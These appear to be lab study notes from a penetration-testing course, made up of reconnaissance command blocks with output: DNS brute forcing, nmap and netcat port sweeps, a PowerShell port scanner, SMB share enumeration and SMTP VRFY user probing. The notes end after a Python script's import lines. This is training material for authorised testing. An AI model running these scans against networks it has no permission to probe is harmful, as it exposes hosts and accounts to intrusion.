<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">gobuster</span> <span class="n">vhost</span> <span class="n">-u</span> <span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span> <span class="n">-w</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dnsmap</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="n">seq</span> <span class="n">200</span> <span class="n">254</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-v</span> <span class="s2">&quot;not</span>
<span class="s2">found&quot;</span>
<span class="p">...</span>
<span class="n">208</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">admin</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">209</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">beta</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">210</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">fs1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">211</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">intranet</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">212</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">213</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">214</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">215</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">siem</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">216</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">snmp</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">217</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">syslog</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">218</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">support</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">219</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">test</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
<span class="n">220</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">vpn</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-t</span> <span class="n">std</span>
<span class="p">[*]</span> <span class="n">std</span><span class="p">:</span> <span class="n">Performing</span> <span class="n">General</span> <span class="n">Enumeration</span> <span class="n">against</span><span class="p">:</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">...</span>
<span class="p">[-]</span> <span class="n">DNSSEC</span> <span class="n">is</span> <span class="n">not</span> <span class="n">configured</span> <span class="k">for</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="p">[*]</span> <span class="n">SOA</span> <span class="n">ns1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">79</span><span class="p">.</span><span class="n">37</span><span class="p">.</span><span class="n">18</span>
<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">79</span><span class="p">.</span><span class="n">37</span><span class="p">.</span><span class="n">18</span>
<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns3</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">66</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">207</span><span class="p">.</span><span class="n">180</span>
<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">39</span><span class="p">.</span><span class="n">63</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">spool</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">1</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">217</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">216</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">215</span>
<span class="p">[*]</span> <span class="n">MX</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">213</span>
<span class="p">[*]</span> <span class="n">TXT</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="k">Try</span> <span class="n">Harder</span>
<span class="p">[*]</span> <span class="n">TXT</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">google-site</span><span class="p">-</span>
<span class="n">verification</span><span class="p">=</span><span class="n">U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA</span>
<span class="p">[*]</span> <span class="n">Enumerating</span> <span class="n">SRV</span> <span class="n">Records</span>
<span class="p">[+]</span> <span class="n">0</span> <span class="n">Records</span> <span class="n">Found</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span>
<span class="n">www</span>
<span class="n">ftp</span>
<span class="n">mail</span>
<span class="n">owa</span>
<span class="n">proxy</span>
<span class="n">router</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-D</span> <span class="p">~/</span><span class="n">list</span><span class="p">.</span><span class="n">txt</span> <span class="n">-t</span> <span class="n">brt</span>
<span class="p">[*]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">dictionary</span> <span class="n">file</span><span class="p">:</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">kali</span><span class="p">/</span><span class="n">list</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">provided</span> <span class="n">by</span> <span class="n">user</span><span class="p">)</span>
<span class="p">[*]</span> <span class="n">brt</span><span class="p">:</span> <span class="n">Performing</span> <span class="n">host</span> <span class="n">and</span> <span class="n">subdomain</span> <span class="n">brute</span> <span class="n">force</span> <span class="n">against</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">...</span>
<span class="p">[+]</span>   <span class="n">A</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
<span class="p">[+]</span>   <span class="n">A</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
<span class="p">[+]</span>   <span class="n">A</span> <span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">214</span>
<span class="p">[+]</span> <span class="n">3</span> <span class="n">Records</span> <span class="n">Found</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsenum</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
<span class="p">...</span>
<span class="n">dnsenum</span> <span class="n">VERSION</span><span class="p">:</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">6</span>
<span class="p">-----</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="p">-----</span>
<span class="p">...</span>
<span class="n">Brute</span> <span class="n">forcing</span> <span class="n">with</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">dnsenum</span><span class="p">/</span><span class="n">dns</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span>
<span class="n">_______________________________________________</span>
<span class="n">admin</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>   <span class="n">5</span>     <span class="k">IN</span>       <span class="n">A</span>              <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">208</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="n">nslookup</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span>
<span class="n">DNS</span> <span class="n">request</span> <span class="n">timed</span> <span class="n">out</span><span class="p">.</span>
<span class="n">timeout</span> <span class="n">was</span> <span class="n">2</span> <span class="n">seconds</span><span class="p">.</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">UnKnown</span>
<span class="n">Address</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">TXT</span> <span class="n">info</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">UnKnown</span>
<span class="n">Address</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
<span class="n">info</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span>
<span class="n">text</span> <span class="p">=</span>
<span class="s2">&quot;greetings from the TXT record body&quot;</span>
</code></pre></div>

<h3>TC/UDP Scanning</h3>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nvv</span> <span class="n">-w</span> <span class="n">1</span> <span class="n">-z</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span> <span class="n">3388</span><span class="p">-</span><span class="n">3390</span>
<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3390</span> <span class="p">(?)</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">refused</span>
<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3389</span> <span class="p">(</span><span class="n">ms-wbt-server</span><span class="p">)</span> <span class="n">open</span>
<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3388</span> <span class="p">(?)</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">refused</span>
<span class="n">sent</span> <span class="n">0</span><span class="p">,</span> <span class="n">rcvd</span> <span class="n">0</span>
</code></pre></div>

<p>![[Pasted image 20240202113027.png]]</p>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nv</span> <span class="n">-u</span> <span class="n">-z</span> <span class="n">-w</span> <span class="n">1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">120</span><span class="p">-</span><span class="n">123</span>
<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span><span class="p">]</span> <span class="n">123</span> <span class="p">(</span><span class="n">ntp</span><span class="p">)</span> <span class="n">open</span>
</code></pre></div>

<p>![[Pasted image 20240202113105.png]]</p>
<h3>Port Scanning with Nmap</h3>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-I</span> <span class="n">INPUT</span> <span class="n">1</span> <span class="n">-s</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">-j</span> <span class="n">ACCEPT</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-I</span> <span class="n">OUTPUT</span> <span class="n">1</span> <span class="n">-d</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">-j</span> <span class="n">ACCEPT</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-Z</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-vn</span> <span class="n">-L</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-Z</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-p</span> <span class="n">1</span><span class="p">-</span><span class="n">65535</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-vn</span> <span class="n">-L</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sS</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="n">-sS</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sn</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-sn</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="nb">ping-sweep</span><span class="p">.</span><span class="n">txt</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">grep</span> <span class="n">Up</span> <span class="nb">ping-sweep</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="n">cut</span> <span class="n">-d</span> <span class="s2">&quot; &quot;</span> <span class="o">-f</span> <span class="n">2</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-p</span> <span class="n">80</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="n">web-sweep</span><span class="p">.</span><span class="n">txt</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">grep</span> <span class="n">open</span> <span class="n">web-sweep</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="n">cut</span> <span class="n">-d</span><span class="s2">&quot; &quot;</span> <span class="n">-f2</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">-A</span> <span class="p">-</span><span class="n">-top-ports</span><span class="p">=</span><span class="n">20</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="n">top-port-sweep</span><span class="p">.</span><span class="n">txt</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">nmap-services</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-O</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">14</span> <span class="p">-</span><span class="n">-osscan-guess</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">-A</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">14</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">http-headers</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">6</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="p">-</span><span class="n">-script-help</span> <span class="n">http-headers</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">445</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
<span class="n">ComputerName</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
<span class="n">RemoteAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
<span class="n">RemotePort</span> <span class="p">:</span> <span class="n">445</span>
<span class="n">InterfaceAlias</span> <span class="p">:</span> <span class="n">Ethernet0</span>
<span class="n">SourceAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
<span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="n">1</span><span class="p">..</span><span class="n">1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">New-Object</span>
<span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">&quot;192.168.50.151&quot;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">))</span> <span class="s2">&quot;TCP port $_ is open&quot;</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
<span class="n">TCP</span> <span class="n">port</span> <span class="n">88</span> <span class="n">is</span> <span class="n">open</span>
</code></pre></div>

<h3>SMB Enumeration</h3>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-p</span> <span class="n">139</span><span class="p">,</span><span class="n">445</span> <span class="n">-oG</span> <span class="n">smb</span><span class="p">.</span><span class="n">txt</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">254</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">smb</span><span class="p">.</span><span class="n">txt</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nbtscan</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">ls </span><span class="p">-</span><span class="n">1</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">scripts</span><span class="p">/</span><span class="n">smb</span><span class="p">*</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">ls </span><span class="p">-</span><span class="n">1</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">scripts</span><span class="p">/</span><span class="n">smb</span><span class="p">*</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-p</span> <span class="n">139</span><span class="p">,</span><span class="n">445</span> <span class="p">-</span><span class="n">-script</span> <span class="n">smb-os-discovery</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">view</span> <span class="p">\\</span><span class="n">dc01</span> <span class="p">/</span><span class="n">all</span>
</code></pre></div>

<h3>SMTP Enumeration</h3>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nv</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> <span class="n">25</span>
<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span><span class="p">]</span> <span class="n">25</span> <span class="p">(</span><span class="n">smtp</span><span class="p">)</span> <span class="n">open</span>
<span class="n">220</span> <span class="n">mail</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">VRFY</span> <span class="n">root</span>
<span class="n">252</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">root</span>
<span class="n">VRFY</span> <span class="n">idontexist</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>
